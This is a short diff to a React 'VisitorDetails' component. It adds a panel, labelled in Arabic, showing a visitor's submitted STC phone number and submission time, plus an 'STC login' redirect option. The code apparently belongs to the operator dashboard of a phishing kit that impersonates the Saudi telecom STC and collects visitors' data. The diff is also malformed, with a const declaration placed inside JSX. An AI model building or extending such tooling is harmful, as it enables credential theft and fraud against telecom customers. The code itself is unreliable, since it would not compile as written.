@@ -674,7 +674,24 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                   </span>
                 </span>
               </div>
+{/* Display STC Data */}
+{visitor.stcPhone && (
+  <div className="bg-purple-50 border-l-4 border-purple-500 p-4 rounded-lg">
+    <h4 className="font-semibold text-purple-900 mb-2">
+      بيانات STC
+    </h4>
+    <div className="space-y-2 text-sm">
+      <div>الجوال: {visitor.stcPhone}</div>
+      <div>التاريخ: {visitor.stcSubmittedAt}</div>
+    </div>
+  </div>
+)}
 
+{/* Add to Redirect Options */}
+const redirectOptions = [
+  // ... existing options ...
+  { value: "stc", label: "تسجيل دخول STC" },
+];
               {/* Device & Location Info */}
               {(visitor.country || visitor.browser || visitor.deviceType) && (
                 <div className="flex items-center gap-2 text-xs text-gray-500">
